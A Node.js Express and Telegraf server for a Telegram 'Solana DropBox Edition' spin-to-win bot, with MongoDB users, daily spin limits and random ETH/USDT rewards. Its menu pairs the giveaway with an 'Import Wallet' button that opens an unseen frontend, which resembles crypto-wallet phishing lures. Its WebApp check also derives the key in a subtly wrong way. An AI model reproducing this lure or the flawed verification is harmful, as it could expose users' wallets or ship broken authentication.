// server.js (updated)
import express from "express";
import { Telegraf, Markup } from "telegraf";
import mongoose from "mongoose";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

const app = express();
app.use(express.json());

// Use environment port (required by many hosts) or 5000 default
const PORT = parseInt(process.env.PORT || "5000", 10);

// ===== MongoDB Connect =====
async function connectMongo() {
  try {
    await mongoose.connect(process.env.MONGO_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      // keep other options if needed
    });
    console.log("✅ MongoDB Connected");
  } catch (err) {
    console.error("❌ MongoDB Error:", err);
    // Do not crash the process here; log and let process managers restart if needed
  }
}
connectMongo();

// Reconnect logic if disconnected
mongoose.connection.on("disconnected", () => {
  console.warn("⚠️ MongoDB disconnected. Trying to reconnect...");
  setTimeout(connectMongo, 2000);
});

// ===== User Schema =====
const userSchema = new mongoose.Schema({
  telegramId: { type: String, required: true, index: true },
  spinsLeft: { type: Number, default: 3 },
  rewards: [String],
  balance: { type: Number, default: 0 },
  lastSpinDate: { type: Date, default: null }
});
const User = mongoose.model("User", userSchema);

// ===== Telegram Bot (guarded) =====
let bot;
if (process.env.BOT_TOKEN) {
  try {
    bot = new Telegraf(process.env.BOT_TOKEN);

    // /start command
    bot.start(async (ctx) => {
      try {
        const telegramId = ctx.from.id.toString();

        let user = await User.findOne({ telegramId });
        if (!user) {
          user = new User({ telegramId });
          await user.save();
        }

        await ctx.reply(
          "🎮 Welcome to Solana DropBox Edition! This is a Demo spin to win SOL tokens",
          Markup.inlineKeyboard([
            [Markup.button.webApp("Start SOL Spin", process.env.FRONTEND_URL)],
            [Markup.button.webApp("Import Wallet", process.env.FRONTEND_URL)],
            [Markup.button.webApp("Stake Coin", process.env.FRONTEND_URL)],
            [Markup.button.webApp("Stop Games", process.env.FRONTEND_URL)]
          ])
        );
      } catch (err) {
        console.error("Error in /start handler:", err);
      }
    });

    // /balance command
    bot.command("balance", async (ctx) => {
      try {
        const telegramId = ctx.from.id.toString();
        let user = await User.findOne({ telegramId });
        if (!user) {
          return ctx.reply("⚠️ You don’t have an account yet. Type /start first.");
        }
        const rewardsList = user.rewards.length > 0 ? user.rewards.join(", ") : "No rewards yet";
        await ctx.reply(
          `📊 *Your Balance Summary*\n\n` +
          `💰 Balance: *${user.balance}*\n` +
          `🎯 Spins Left Today: *${user.spinsLeft}*\n` +
          `🏆 Rewards: ${rewardsList}`,
          { parse_mode: "Markdown" }
        );
      } catch (err) {
        console.error("Error in /balance handler:", err);
      }
    });

    // /help command
    bot.command("help", async (ctx) => {
      await ctx.reply(
        `🆘 *Available Commands*\n\n` +
        `/start – Start the game and get access to spin\n` +
        `/balance – View your balance, spins left, and rewards\n` +
        `/help – Show this help menu\n\n` +
        `👉 Use the buttons to *Spin, Import Wallet, Stake, or Stop Games*`,
        { parse_mode: "Markdown" }
      );
    });

    bot.launch()
      .then(() => console.log("🤖 Telegram bot launched"))
      .catch(err => console.error("Telegram launch error:", err));

  } catch (err) {
    console.error("Failed to initialize Telegram bot:", err);
  }
} else {
  console.warn("⚠️ BOT_TOKEN not set — Telegram bot will not start.");
}

// ===== Telegram Verification =====
// Uses Telegram WebApp verification pattern: secret_key = SHA256(bot_token)
function verifyTelegram(initData) {
  try {
    if (!initData) return false;

    const parsed = new URLSearchParams(initData);
    const hash = parsed.get("hash");
    if (!hash) return false;

    // Remove hash from params then build data_check_string
    parsed.delete("hash");
    const dataCheckString = [...parsed.entries()]
      .map(([key, val]) => `${key}=${val}`)
      .sort()
      .join("\n");

    // secret_key = SHA256(bot_token)
    const secretKey = crypto.createHash("sha256").update(process.env.BOT_TOKEN || "").digest();

    // calculate HMAC using secretKey
    const hmac = crypto.createHmac("sha256", secretKey)
      .update(dataCheckString)
      .digest("hex");

    return hmac === hash;
  } catch (err) {
    console.error("verifyTelegram error:", err);
    return false;
  }
}

// Helper to extract telegramId robustly from initData (Telegram supplies 'user' JSON)
function extractTelegramId(initData) {
  try {
    const parsed = new URLSearchParams(initData);
    const userStr = parsed.get("user"); // usually JSON string like {"id":123,"first_name":...}
    if (userStr) {
      const userObj = JSON.parse(userStr);
      if (userObj && userObj.id) return userObj.id.toString();
    }
    // fallback to common keys
    const id = parsed.get("id") || parsed.get("user_id") || parsed.get("user_id");
    if (id) return id.toString();
    return null;
  } catch (err) {
    console.error("extractTelegramId error:", err);
    return null;
  }
}

// ===== Health & Root Routes =====
app.get("/", (req, res) => {
  res.send("✅ Backend is running");
});

// explicit health route for UptimeRobot
app.get("/health", (req, res) => {
  res.status(200).json({ status: "ok", uptime: process.uptime() });
});

// ===== Spin API =====
app.post("/api/spin", async (req, res) => {
  try {
    const { initData } = req.body;
    if (!initData) return res.status(400).json({ error: "Missing initData" });

    if (!verifyTelegram(initData)) {
      return res.status(403).json({ error: "Invalid Telegram data" });
    }

    const telegramId = extractTelegramId(initData);
    if (!telegramId) return res.status(400).json({ error: "Cannot determine user id" });

    let user = await User.findOne({ telegramId });
    if (!user) {
      user = new User({ telegramId });
      await user.save();
    }

    const today = new Date();
    if (!user.lastSpinDate || user.lastSpinDate.toDateString() !== today.toDateString()) {
      user.spinsLeft = 3;
      user.lastSpinDate = today;
    }

    if (user.spinsLeft <= 0) {
      return res.json({ error: "No spins left today", spinsLeft: user.spinsLeft });
    }

    user.spinsLeft -= 1;

    const rewards = [
      { label: "0.001 ETH", value: 0.001 },
      { label: "5 USDT", value: 5 },
      { label: "Try Again", value: 0 },
      { label: "0.1 ETH", value: 0.1 },
    ];

    const reward = rewards[Math.floor(Math.random() * rewards.length)];
    if (reward.value > 0) {
      user.balance += reward.value;
      user.rewards.push(reward.label);
    }

    await user.save();

    return res.json({ reward: reward.label, balance: user.balance, spinsLeft: user.spinsLeft });
  } catch (err) {
    console.error("Error in /api/spin:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
});

// ===== Automatic Daily Reset (Midnight UTC) =====
// schedule a reset at the next UTC midnight, then every 24h
async function resetSpinsForAllUsers() {
  try {
    await User.updateMany({}, { spinsLeft: 3, lastSpinDate: new Date() });
    console.log("🔄 Spins reset for all users (UTC)");
  } catch (err) {
    console.error("Error resetting spins:", err);
  }
}

function scheduleDailyResetAtUtcMidnight() {
  const now = new Date();
  // compute next UTC midnight
  const next = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate() + 1));
  const msUntilNext = next.getTime() - now.getTime();
  console.log(`Scheduling daily reset in ${Math.round(msUntilNext / 1000)}s`);
  setTimeout(async () => {
    await resetSpinsForAllUsers();
    // then set an interval every 24h
    setInterval(resetSpinsForAllUsers, 24 * 60 * 60 * 1000);
  }, msUntilNext);
}
scheduleDailyResetAtUtcMidnight();

// ===== Error handling middleware =====
app.use((err, req, res, next) => {
  console.error("Unhandled express error:", err);
  res.status(500).json({ error: "Server error" });
});

// ===== Global process handlers =====
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
  // recommended: crash or log and let process manager handle it. We'll log and continue.
});

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  // In production, consider exiting the process so the host restarts it:
  // process.exit(1);
});

// ===== Start Server =====
app.listen(PORT, () => console.log(`🚀 Backend running on port ${PORT}`));
